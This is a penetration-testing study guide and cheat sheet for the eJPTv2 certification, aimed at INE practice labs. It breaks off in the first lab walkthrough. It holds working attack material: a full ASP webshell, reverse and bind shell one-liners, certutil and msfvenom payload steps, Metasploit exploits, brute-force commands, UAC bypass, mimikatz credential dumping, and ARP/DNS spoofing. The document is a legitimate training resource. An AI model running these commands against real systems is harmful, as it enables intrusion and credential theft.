# eJPTv2 — MASTER README & COMPLETE LAB GUIDE

**Compiled by Dr. Mohammed Tawfik** · *Assistant Professor of Cybersecurity & Cloud Computing*
Sana'a University (Yemen) · Ajloun National University (Jordan)
kmkhol01@gmail.com · ORCID: 0000-0002-1227-387X · Edition 2026

> One file to rule them all. This consolidates every lab, command, tool, workflow, and exam tip
> from the full study guide, the master lab reference, the quick cheatsheet, and all worked lab
> sessions. Use `Ctrl+F` heavily during the exam.

---

## TABLE OF CONTENTS

1. [Exam Facts & Domain Weights](#1-exam-facts--domain-weights)
2. [Universal Methodology (every engagement)](#2-universal-methodology-every-engagement)
3. [Lab Signatures — Recognize & Respond](#3-lab-signatures--recognize--respond)
4. [Master Tools Index](#4-master-tools-index)
5. [Wordlist & Resource Locations on Kali](#5-wordlist--resource-locations-on-kali)
6. [PART A — Reconnaissance & Scanning](#part-a--reconnaissance--scanning)
7. [PART B — Service Enumeration & Exploitation](#part-b--service-enumeration--exploitation)
8. [PART C — Exploitation & Shells](#part-c--exploitation--shells)
9. [PART D — Post-Exploitation & Privilege Escalation](#part-d--post-exploitation--privilege-escalation)
10. [PART E — Pivoting & Lateral Movement](#part-e--pivoting--lateral-movement)
11. [PART F — Network Attacks](#part-f--network-attacks)
12. [PART G — Password Cracking](#part-g--password-cracking)
13. [PART H — Web Application Pentesting](#part-h--web-application-pentesting)
14. [COMPLETE LAB WALKTHROUGHS (every lab, step by step)](#complete-lab-walkthroughs)
    - [Service / Network Command Labs (1–15)](#service--network-command-labs)
    - [Linux Enumeration & Privesc Labs (1–8)](#linux-enumeration--privesc-labs)
    - [Windows Exploitation Labs (1–8)](#windows-exploitation-labs)
15. [Lab → Technique Quick Map](#15-lab--technique-quick-map)
16. [Exam Strategy & Tips](#16-exam-strategy--tips)
17. [Flag Formats](#17-flag-formats)

---

## 1. EXAM FACTS & DOMAIN WEIGHTS

- **Format:** 48-hour, hands-on, open-book practical. ~35 multiple-choice questions answerable only by attacking the lab.
- **Provided:** Letter of Engagement, VPN/in-browser access to a target network, lab guidelines.
- **Style:** simulates a black-box pentest with minimal target info; full unrestricted access for the duration.
- **Dynamic flags:** randomly generated and injected into the lab environment.
- **Expiration:** the certification is valid for 3 years.

| Domain | Weight | Focus | Min pass |
|---|---|---|---|
| Assessment Methodologies | ~25–30% | Recon, footprinting, scanning, enumeration | ~90% |
| Host & Network Auditing | ~25% | Hash/password gathering, file enumeration | ~80% |
| Host & Network Pentesting | ~35–40% | Exploitation, Metasploit, post-ex, pivoting | ~70% |
| Web Application Pentesting | ~15–20% | OWASP basics, SQLi, XSS, file upload | ~60% |
| Auditing Fundamentals | ~10% | Reporting, methodology | — |

> Overall pass: at least ~70% **plus** the minimum in each domain section. (Percentages reflect the
> two source documents; treat them as approximate and confirm against your current exam brief.)

---

## 2. UNIVERSAL METHODOLOGY (every engagement)

```
1. Host discovery      nmap -sn <CIDR>              (or -Pn if ICMP blocked)
2. Port scan           nmap -sS -p- --min-rate 1000 <target>
3. Service versions    nmap -sV -sC -p<ports> <target>
4. UDP top ports       nmap -sU --top-ports 100 <target>
5. Per-service enum    (SMB/HTTP/FTP/etc — see PART B)
6. Find exploits       searchsploit <service> <version>
7. Exploit             MSF module or manual
8. Local enum          whoami, sysinfo, ipconfig / ip a
9. Privesc             getsystem / incognito / UACMe / Unattend.xml / SUID / sudo -l
10. Loot + pivot       hashdump, autoroute, find flags
```

**Core rules of thumb**
- Recon first, always: full port scan → versions → per-service enumeration.
- Match the signature, then run the matching playbook (see §3).
- MSF first, manual fallback (smbclient, curl, custom shells).
- Read the question — some flags are file contents (MD5), some are facts (a port, a username).
- Always `-p-`: services hide on non-default ports (RDP 3333, FTP 5554, SSH 2222).

---

## 3. LAB SIGNATURES — RECOGNIZE & RESPOND

| Open port / banner | Likely lab | First move |
|---|---|---|
| ICMP blocked, nmap says "down" | Firewalled host | `nmap -Pn` |
| 80 → `HttpFileServer 2.3` | Rejetto HFS | `rejetto_hfs_exec` |
| 80 → IIS + `DAV:` in OPTIONS | WebDAV | `davtest` → upload shell |
| 80 → Apache | Apache enum | `http_*` MSF modules |
| 80 → BadBlue 2.7 | BadBlue | `badblue_passthru` |
| 21 → vsftpd / ProFTPD | FTP | anon login → brute → searchsploit |
| 22 → OpenSSH | SSH | brute `ssh_login` / libssh bypass |
| 25 → Postfix/SMTP | Mail recon | VRFY / `smtp_enum` |
| 139/445 → Samba | SMB recon | `enum4linux`, `smb_login` |
| 139/445 → Samba 3.0.20 | usermap_script | `exploit/multi/samba/usermap_script` |
| 139/445 → Samba 3.x–4.x | SambaCry | `is_known_pipename` |
| 161/udp → SNMP | SNMP | `snmpwalk -c public` |
| 445 → Windows SMB | psexec | `smb_login` → `psexec` |
| 3306 → MySQL | MySQL enum | `mysql_login` → `mysql_*` |
| 3333 / odd port → RDP | Insecure RDP | `rdp_scanner` → Hydra → `xfreerdp` |
| 5985 → wsman | WinRM | `winrm_login` → `winrm_script_exec` |
| CGI script + Apache | Shellshock | `apache_mod_cgi_bash_env_exec` / `http-shellshock` |
| Multi-NIC compromised host | Pivoting | `autoroute` + portscan/proxychains |

---

## 4. MASTER TOOLS INDEX

| Category | Tools |
|---|---|
| Discovery / scanning | `nmap`, `ping`, `netdiscover`, `arp-scan` |
| Banner / service | `nc`/`netcat`, `telnet`, `whatweb`, `nmap --script=banner` |
| SMB | `enum4linux`, `smbclient`, `rpcclient`, `smbmap`, `nmblookup`, MSF `smb_*` |
| HTTP / web | `curl`, `gobuster`, `dirb`, `ffuf`, `wget`, `whatweb`, `wpscan`, Burp Suite |
| WebDAV | `davtest`, `cadaver`, `curl -T`, custom ASP shell |
| FTP | `ftp`, `hydra`, MSF `ftp_*` |
| SSH | `hydra`, MSF `ssh_login`, `libssh_auth_bypass`, `ssh2john` |
| SMTP | `nc`/`telnet` (VRFY), `smtp-user-enum`, `sendemail`, MSF `smtp_enum` |
| MySQL | `mysql`, MSF `mysql_*` |
| SNMP | `snmpwalk`, `nmap snmp-*`, `onesixtyone` |
| RDP | `xfreerdp`, `hydra`, MSF `rdp_scanner` |
| WinRM | `evil-winrm`, MSF `winrm_*` |
| Exploitation | Metasploit (`msfconsole`/`msfvenom`), `searchsploit` |
| Shells | `nc`/`nc.exe`, `bash -i`, `python pty`, `certutil` (download) |
| Win privesc | `getsystem`, `incognito`, UACMe (`Akagi64.exe`), PowerUp/PowerSploit, PrivescCheck, `kiwi`/mimikatz, `runas` |
| Linux privesc | `sudo -l`, SUID `find`, `getcap`, LinEnum, linpeas, GTFOBins |
| Pivoting | `autoroute`, `socks_proxy` + `proxychains`, `portfwd`, static nmap |
| Network attacks | `smb_relay`, `dnsspoof`, `arpspoof`, `responder` |
| Cracking | `hashid`, `hashcat`, `john`, `unshadow`, `ssh2john`, `zip2john` |

---

## 5. WORDLIST & RESOURCE LOCATIONS ON KALI

```bash
# Metasploit built-in wordlists
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
/usr/share/metasploit-framework/data/wordlists/directory.txt

# rockyou (extract first!)
gunzip /usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/rockyou.txt

# dirb / dir brute
/usr/share/wordlists/dirb/common.txt

# Lab-provided (varies — always ls first)
/root/Desktop/wordlists/

# Webshells
/usr/share/webshells/asp/      /usr/share/webshells/aspx/      /usr/share/webshells/php/

# Windows binaries (nc.exe etc.)
/usr/share/windows-binaries/
/usr/share/windows-resources/binaries/
/usr/share/windows-resources/mimikatz/x64/
```

---

# PART A — RECONNAISSANCE & SCANNING

## A1. Host Discovery & Port Scanning
```bash
ping -c 4 demo.ine.local
nmap -sn 10.0.0.0/24                         # host discovery (skip if ICMP blocked)
nmap -Pn demo.ine.local                      # ICMP blocked / host shows "down" → force
nmap -sV demo.ine.local
nmap -sS -sV -O demo.ine.local
nmap -sS -p- --min-rate 1000 demo.ine.local  # full TCP — catches odd ports!
nmap -Pn -sV -p 80 demo.ine.local
nmap -sU -p 161 demo.ine.local               # UDP (SNMP, DNS, etc.)
nmap -sU --top-ports 25 demo.ine.local
nmap -Pn -p 443 demo.ine.local               # confirm a "filtered" port
```
**Port states:** open = listening | closed = reachable, nothing there | filtered = firewall dropping probes | open|filtered = UDP undetermined.

## A2. Banner Grabbing
```bash
ifconfig                                     # find your IP/interface
nmap -sV -O <target>
nmap -sV --script=banner <target>
nc <target> 22                               # raw banner
nc -nv <target> 80
```

## A3. Nmap Enumeration Scripts
```bash
nmap --script http-enum -sV -p 80 demo.ine.local
nmap -p445 --script smb-protocols demo.ine.local
nmap -p445 --script smb-security-mode demo.ine.local
nmap -p445 --script smb-os-discovery.nse demo.ine.local
nmap -p445 --script smb-enum-users.nse demo.ine.local
nmap -p445 --script smb-enum-shares demo.ine.local
nmap -sU -p 161 --script=snmp-brute demo.ine.local
nmap -sU -p 161 --script "snmp-*" demo.ine.local
nmap -sV --script vuln demo.ine.local
ls -al /usr/share/nmap/scripts | grep vuln
```

## A4. Vulnerability Scanning — Shellshock example
```bash
nmap -sV -O 192.152.25.3
nmap -sV -p 80 --script=http-shellshock \
  --script-args "http-shellshock.uri=/gettime.cgi" 192.152.25.3
```

---

# PART B — SERVICE ENUMERATION & EXPLOITATION

## B1. FTP (port 21, or non-default like 5554)
```bash
nmap -sV -sC -p 21 demo.ine.local
ftp demo.ine.local                           # try anonymous/anonymous
ftp demo.ine.local 5554                      # non-default port
searchsploit vsftpd
searchsploit proftpd 1.3.5

# MSF: version / brute / anon
use auxiliary/scanner/ftp/ftp_version  ; set RHOSTS demo.ine.local ; run
use auxiliary/scanner/ftp/ftp_login    ; set RHOSTS demo.ine.local ; \
  set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt ; \
  set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ; run
use auxiliary/scanner/ftp/anonymous    ; set RHOSTS demo.ine.local ; run

# Hydra (FTP works fine, unlike SMB)
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local ftp
hydra -L users.txt -P pass.txt -s 5554 ftp://demo.ine.local
```
**vsftpd 2.3.4 backdoor**
```bash
use exploit/unix/ftp/vsftpd_234_backdoor ; set RHOSTS demo.ine.local ; run   # patched → fall back to brute
```
**LAB FACT:** ProFTPD 1.3.5a → brute found `sysadmin:654321`. FTP banner can leak weak-password users.

## B2. SMB / Samba (ports 139, 445)
```bash
nmap -sV -p 139,445 demo.ine.local
nmap -p445 --script smb-protocols demo.ine.local
nmap -p445 --script smb-os-discovery.nse demo.ine.local

smbclient -L //demo.ine.local -N             # null session
smbclient -L //demo.ine.local -U guest

enum4linux -a demo.ine.local
enum4linux -U demo.ine.local                 # users
enum4linux -S demo.ine.local                 # shares
enum4linux -r demo.ine.local                 # RID cycling

# rpcclient (when enum4linux/smbclient fail)
rpcclient -U "" -N demo.ine.local
#  srvinfo ; enumdomusers ; netshareenumall (← hidden shares) ; querydominfo ; exit

smbmap -H demo.ine.local -u guest -p ''
smbmap -H demo.ine.local -u <user> -p <pass>
nmblookup -A demo.ine.local

smbclient //demo.ine.local/<share> -N
smbclient //demo.ine.local/<share> -U <user>
#  ls ; recurse ON ; prompt OFF ; mget * ; get file ; exit
smbclient //demo.ine.local/<share> -U user%pass -c 'recurse ON; prompt OFF; mget *'
```
**SMB login brute (USE THIS, not Hydra — Hydra only does SMBv1)**
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
# one-liner, single user:
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS demo.ine.local; set SMBUser alice; set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt; set VERBOSE false; set STOP_ON_SUCCESS true; run; exit"
```
**Brute-force hidden share names**
```bash
while read share; do
  result=$(smbclient //demo.ine.local/"$share" -N -c 'ls' 2>&1 | head -3)
  if ! echo "$result" | grep -q "BAD_NETWORK_NAME"; then
    echo "=== $share ==="; echo "$result"; echo ""
  fi
done < /root/Desktop/wordlists/shares.txt
```
**Samba usermap_script (Samba 3.0.20)**
```bash
use exploit/multi/samba/usermap_script ; set RHOSTS demo.ine.local ; exploit   # → root, no payload
```
**Windows SMB → psexec (valid creds)**
```bash
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local ; set SMBUser Administrator ; set SMBPass <password> ; exploit
```
**Error codes:** `BAD_NETWORK_NAME` = no such share | `ACCESS_DENIED` = exists, needs auth | `smb: \>` = anonymous worked.

## B3. HTTP / Apache (port 80)
```bash
curl -I http://demo.ine.local/
curl -X OPTIONS http://demo.ine.local/ -v          # look for PUT/DAV
curl http://demo.ine.local/robots.txt
gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt
dirb http://demo.ine.local
ffuf -u http://demo.ine.local/FUZZ -w wordlist.txt -fc 404

# MSF HTTP auxiliary suite (Apache enum lab — all 10)
use auxiliary/scanner/http/http_version            ; set RHOSTS victim-1 ; run
use auxiliary/scanner/http/robots_txt              ; set RHOSTS victim-1 ; run
use auxiliary/scanner/http/http_header             ; set RHOSTS victim-1 ; run
use auxiliary/scanner/http/brute_dirs              ; set RHOSTS victim-1 ; run
use auxiliary/scanner/http/dir_scanner             ; set RHOSTS victim-1 ; set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt ; run
use auxiliary/scanner/http/dir_listing             ; set RHOSTS victim-1 ; set PATH /data ; run
use auxiliary/scanner/http/files_dir               ; set RHOSTS victim-1 ; set VERBOSE false ; run
use auxiliary/scanner/http/http_put                ; set RHOSTS victim-1 ; set PATH /data ; set FILENAME test.txt ; set FILEDATA "test" ; run
use auxiliary/scanner/http/http_login              ; set RHOSTS victim-1 ; set AUTH_URI /secure/ ; set VERBOSE false ; run
use auxiliary/scanner/http/apache_userdir_enum     ; set RHOSTS victim-1 ; set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt ; set VERBOSE false ; run
wget http://victim-1:80/data/test.txt ; cat test.txt   # verify PUT  (set ACTION DELETE ; run  to remove)

whatweb http://demo.ine.local
wpscan --url http://demo.ine.local --enumerate u,t,p
```

## B4. WebDAV (IIS, port 80)
```bash
curl -X OPTIONS http://demo.ine.local/webdav/ -v -u bob:password_123321   # look for DAV:
davtest -url http://demo.ine.local/webdav
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav

# METHOD 1 — MSF (try first)
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local ; set HttpUsername bob ; set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp ; exploit
#  → meterpreter ; shell ; cd / ; dir ; type flag.txt

# METHOD 2 — Manual custom ASP shell (when MSF/old shells fail to render output)
cat > /tmp/shell.asp << 'EOF'
<%
sCmd = Request.QueryString("cmd")
If sCmd <> "" Then
  Set oShell = Server.CreateObject("WScript.Shell")
  Set oExec = oShell.Exec("cmd.exe /c " & sCmd)
  Response.Write "<pre>" & Server.HTMLEncode(oExec.StdOut.ReadAll()) & "</pre>"
End If
%>
<form method="GET"><input name="cmd" size="80"><input type="submit" value="Run"></form>
EOF
curl -u bob:password_123321 -T /tmp/shell.asp http://demo.ine.local/webdav/shell.asp
curl -u bob:password_123321 -I http://demo.ine.local/webdav/shell.asp           # expect 200
curl -u bob:password_123321 -G --data-urlencode "cmd=whoami" http://demo.ine.local/webdav/shell.asp
curl -u bob:password_123321 -G --data-urlencode "cmd=type C:\flag.txt" http://demo.ine.local/webdav/shell.asp
```
**LAB FACT:** `/usr/share/webshells/asp/cmdasp.asp` runs but won't render output on modern IIS — use the custom shell. Flag was at `C:\flag.txt`.

## B5. SSH (port 22)
```bash
nmap -sS -sV demo.ine.local
nc demo.ine.local 22                         # banner (flags sometimes live in /etc/issue.net)

use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true ; set VERBOSE true ; exploit
#  sessions -i 1 ; find / -name "flag" ; cat /flag

# libssh auth bypass (CVE-2018-10933) — no password needed!
use auxiliary/scanner/ssh/libssh_auth_bypass ; set RHOSTS demo.ine.local ; set SPAWN_PTY true ; exploit ; sessions -i 1

hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://demo.ine.local -t 4
ssh2john id_rsa > hash.txt ; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
**LAB FACTS:** OpenSSH 7.9p1 → `ssh_login` found `sysadmin:hailey`, flag at `/flag`.

## B6. SMTP / Postfix (port 25)
```bash
nmap -sV -script banner demo.ine.local
nc demo.ine.local 25
#  VRFY admin@openmailbox.xyz       (252 = exists, 550 = no)
telnet demo.ine.local 25
#  HELO attacker.xyz ; EHLO attacker.xyz
smtp-user-enum -M VRFY -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
use auxiliary/scanner/smtp/smtp_enum ; set RHOSTS demo.ine.local ; exploit

# Send fake mail (telnet)
#  HELO attacker.xyz ; mail from: admin@attacker.xyz ; rcpt to: root@openmailbox.xyz ; data ; Subject:... ; . 
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "fake message" -o tls=no
```

## B7. MySQL (port 3306)
```bash
nmap demo.ine.local                          # confirm 3306
use auxiliary/scanner/mysql/mysql_version  ; set RHOSTS demo.ine.local ; run
use auxiliary/scanner/mysql/mysql_login    ; set RHOSTS demo.ine.local ; set USERNAME root ; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ; set VERBOSE false ; run
use auxiliary/admin/mysql/mysql_enum       ; set USERNAME root ; set PASSWORD twinkle ; set RHOSTS demo.ine.local ; run
use auxiliary/admin/mysql/mysql_sql        ; set USERNAME root ; set PASSWORD twinkle ; set RHOSTS demo.ine.local ; run
use auxiliary/scanner/mysql/mysql_hashdump ; set USERNAME root ; set PASSWORD twinkle ; set RHOSTS demo.ine.local ; run
use auxiliary/scanner/mysql/mysql_schemadump ; set USERNAME root ; set PASSWORD twinkle ; set RHOSTS demo.ine.local ; run
mysql -u root -p -h demo.ine.local
#  SHOW DATABASES; USE x; SHOW TABLES; SELECT user,password FROM mysql.user;
```
**LAB FACT:** `root:twinkle` → MySQL 5.5.61. hashdump pulled all account hashes; schemadump revealed databases.

## B8. SNMP (port 161/udp)
```bash
nmap -sU -p 161 demo.ine.local
nmap -sU -p 161 --script=snmp-brute demo.ine.local
snmpwalk -v 1 -c public demo.ine.local
snmpwalk -v 2c -c public demo.ine.local
nmap -sU -p 161 --script "snmp-*" demo.ine.local > snmp_output
# then use discovered users to brute SMB/RDP/etc.
```

## B9. RDP (port 3389, or non-default like 3333)
```bash
nmap -sV demo.ine.local                      # find the RDP port
use auxiliary/scanner/rdp/rdp_scanner ; set RHOSTS demo.ine.local ; set RPORT 3333 ; exploit
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://demo.ine.local -s 3333
xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333 /cert:ignore
```
**LAB FACT:** RDP on 3333 (not 3389). Flag was the port number itself.

## B10. WinRM (port 5985)
```bash
nmap --top-ports 7000 demo.ine.local         # find 5985 wsman
use auxiliary/scanner/winrm/winrm_login ; set RHOSTS demo.ine.local ; set USER_FILE .../common_users.txt ; set PASS_FILE .../unix_passwords.txt ; set VERBOSE false ; exploit
use auxiliary/scanner/winrm/winrm_cmd   ; set RHOSTS demo.ine.local ; set USERNAME administrator ; set PASSWORD tinkerbell ; set CMD whoami ; exploit
use exploit/windows/winrm/winrm_script_exec ; set RHOSTS demo.ine.local ; set USERNAME administrator ; set PASSWORD tinkerbell ; set FORCE_VBS true ; exploit
evil-winrm -i demo.ine.local -u administrator -p tinkerbell
```

---

# PART C — EXPLOITATION & SHELLS

## C1. searchsploit + fixing public exploits
```bash
searchsploit "HTTP File Server 2.3"
searchsploit -m 39161                # copy to cwd
vim 39161.py                         # fix LHOST/LPORT/target
searchsploit -x 39161                # examine
cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/
python -m SimpleHTTPServer 80        # host nc.exe
nc -nvlp 1234                        # listener
python 39161.py demo.ine.local 80    # run
```

## C2. Rejetto HFS 2.3 (port 80)
```bash
nmap -sV -p 80 demo.ine.local        # HttpFileServer httpd 2.3
searchsploit hfs
use exploit/windows/http/rejetto_hfs_exec ; set RHOSTS demo.ine.local ; set LHOST <your_ip> ; exploit
```

## C3. Bind & Reverse Shells (netcat)
```bash
cd /usr/share/windows-binaries ; python -m SimpleHTTPServer 80
# on Windows: certutil -urlcache -f http://<Kali_IP>/nc.exe nc.exe

# BIND (target listens, attacker connects)
nc.exe -nvlp 1234 -e cmd.exe         # Windows
nc -nv <target> 1234                  # Kali

# REVERSE (attacker listens, target connects)
nc -nvlp 1234                         # Kali
nc.exe -nv <Kali_IP> 1234 -e cmd.exe  # Windows
nc <Kali_IP> 1234 -e /bin/bash        # Linux target
bash -i >& /dev/tcp/<Kali_IP>/1234 0>&1   # bash one-liner

# File transfer
nc.exe -nvlp 1234 > received.txt      # receiver
nc -nv <target> 1234 < send.txt       # sender
```

## C4. Upgrade dumb shell to full TTY
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter twice
```

## C5. msfvenom payloads + handler
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > backdoor.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f asp -o shell.asp
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.php

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp ; set LHOST <ip> ; set LPORT 4444 ; exploit -j
```

---

# PART D — POST-EXPLOITATION & PRIVILEGE ESCALATION

## D1. Basic post-ex (meterpreter)
```bash
getuid ; sysinfo ; getsystem ; hashdump ; ps ; migrate <PID> ; shell ; search -f flag.txt
```

## D2. Windows — token impersonation (incognito)
```bash
load incognito
list_tokens -u
impersonate_token ATTACKDEFENSE\\Administrator
getuid
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

## D3. Windows — UAC bypass (UACMe)
```bash
ps -S explorer.exe ; migrate <PID> ; getsystem    # may fail under UAC
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > backdoor.exe
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
# second terminal: multi/handler (see C5)
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
# elevated session:
ps -S lsass.exe ; migrate <lsass_PID> ; hashdump
```

## D4. Windows — Unattend.xml credentials
```bash
powershell -ep bypass
. .\PowerUp.ps1 ; Invoke-PrivescAudit
cat C:\Windows\Panther\Unattend.xml
$password='QWRtaW5AMTIz'
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))  # → Admin@123
runas.exe /user:administrator cmd
# HTA delivery: (Kali) use exploit/windows/misc/hta_server ; exploit   (Target) mshta.exe http://<kali>:8080/<rand>.hta
```

## D5. Credential dumping — Kiwi / Mimikatz
```bash
migrate -N lsass.exe
load kiwi
creds_all ; lsa_dump_sam ; lsa_dump_secrets
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
```

## D6. Linux privesc quick checks
```bash
sudo -l                              # → GTFOBins for any listed binary
find / -perm -4000 2>/dev/null       # SUID
getcap -r / 2>/dev/null              # capabilities
crontab -l ; cat /etc/crontab        # cron
cat /etc/passwd ; cat /etc/shadow    # if readable
./linpeas.sh ; ./LinEnum.sh
```

---

# PART E — PIVOTING & LATERAL MOVEMENT

## E1. Metasploit autoroute (preferred — stable)
```bash
shell ; ip addr                      # note 2nd interface, e.g. 192.180.108.2
run autoroute -s 192.180.108.0/24
# or: use post/multi/manage/autoroute ; set SESSION 1 ; set SUBNET 192.180.108.0 ; run
use auxiliary/scanner/portscan/tcp ; set RHOSTS 192.180.108.3 ; set PORTS 1-1000 ; set VERBOSE false ; exploit
```

## E2. SOCKS proxy + proxychains (external tools)
```bash
use auxiliary/server/socks_proxy ; set SRVPORT 9050 ; set VERSION 4a ; exploit -j ; jobs
# /etc/proxychains4.conf → add:  socks4 127.0.0.1 9050
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
proxychains curl http://192.180.108.3
```

## E3. Port forwarding (single port)
```bash
portfwd add -l 8080 -p 80 -r 192.180.108.3   # localhost:8080 → target:80
portfwd list
```

## E4. Pivot to SMB shares on second host
```bash
sessions -i 1 ; shell
net view 10.0.28.125
migrate -N explorer.exe
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
dir D: ; cat D:\FLAG2.txt
```

## E5. Static binary + bash scanner (no nmap on pivot host)
```bash
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
shell ; cd /tmp/ ; chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
./nmap -p- 192.180.108.3
```
`bash-port-scanner.sh`:
```bash
#!/bin/bash
for port in {1..1000}; do
  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

---

# PART F — NETWORK ATTACKS

## F1. SMB Relay + ARP/DNS spoof (MitM)
```bash
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101 ; set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101 ; set SMBHOST 172.16.5.10 ; exploit

echo "172.16.5.101 *.sportsfoo.com" > dns ; dnsspoof -i eth1 -f dns

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

## F2. Responder (LLMNR/NBT-NS poisoning)
```bash
sudo responder -I eth0 -A          # hashes → /usr/share/responder/logs/
john --format=netntlmv2 <hashfile> --wordlist=rockyou.txt
```

---

# PART G — PASSWORD CRACKING

```bash
hashid '<hash>'
# Hashcat modes: 0=MD5 100=SHA1 1400=SHA256 1000=NTLM 1800=sha512crypt 5600=NetNTLMv2
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 1000 ntlm.txt rockyou.txt --potfile-disable

john --format=raw-md5 --wordlist=rockyou.txt hash.txt
john --format=NT --wordlist=rockyou.txt ntlm.txt
john --show hash.txt

unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt

ssh2john id_rsa > rsa.hash
zip2john file.zip > zip.hash
```

---

# PART H — WEB APPLICATION PENTESTING

> From Module 3 of the study guide. Web app weight is ~15–20% of the exam (OWASP basics, SQLi, XSS, file upload).

## H1. HTTP fundamentals & discovery
```bash
curl -I http://demo.ine.local/
gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt
whatweb http://demo.ine.local
```

## H2. Burp Suite
- Proxy traffic (configure browser → 127.0.0.1:8080), intercept requests, send to Repeater/Intruder.
- Use Repeater to manually tamper parameters; Intruder for fuzzing/brute of fields.

## H3. SQL Injection (SQLi)
- Detect: append `'` and watch for errors; test `' OR '1'='1`.
- Manual UNION-based extraction; or automate with `sqlmap`:
```bash
sqlmap -u "http://demo.ine.local/page?id=1" --dbs
sqlmap -u "http://demo.ine.local/page?id=1" -D <db> --tables
sqlmap -u "http://demo.ine.local/page?id=1" -D <db> -T users --dump
```
> `sqlmap` syntax can change between versions — confirm flags against `sqlmap --help` on your Kali.

## H4. Cross-Site Scripting (XSS)
- Reflected: inject `<script>alert(1)</script>` into reflected parameters.
- Stored: payload persists (comments, profiles). DOM-based: client-side sinks.

## H5. File Upload Vulnerabilities
- Upload a webshell when filters are weak; bypass with double extensions, content-type spoofing, or null bytes (older stacks).
- Match the shell to the stack: `.php` shell from `/usr/share/webshells/php/`, `.asp`/`.aspx` for IIS.

## H6. OWASP Top 10 (2021) — quick reference
A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection · A04 Insecure Design ·
A05 Security Misconfiguration · A06 Vulnerable & Outdated Components · A07 Identification & Auth Failures ·
A08 Software & Data Integrity Failures · A09 Security Logging & Monitoring Failures · A10 SSRF.

---

# COMPLETE LAB WALKTHROUGHS

> Each lab below was worked through end-to-end. Flags/credentials are copied verbatim from the source
> material. IPs vary per session — substitute your own. Target is usually `demo.ine.local`.

## SERVICE / NETWORK COMMAND LABS

### Lab S1 — NetBIOS Hacking (SMB → psexec → pivot)
**Tools:** ping, nmap, smbclient, hydra, MSF (psexec, socks_proxy), proxychains, meterpreter
```bash
ping -c 5 demo.ine.local ; ping -c 5 demo1.ine.local
nmap -sV -p 139,445 demo.ine.local
nmap -p445 --script smb-protocols demo.ine.local
nmap -p445 --script smb-security-mode demo.ine.local
smbclient -L demo.ine.local
nmap -p445 --script smb-enum-users.nse demo.ine.local
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb

use exploit/windows/smb/psexec ; set RHOSTS demo.ine.local ; set SMBUser administrator ; set SMBPass password1 ; exploit
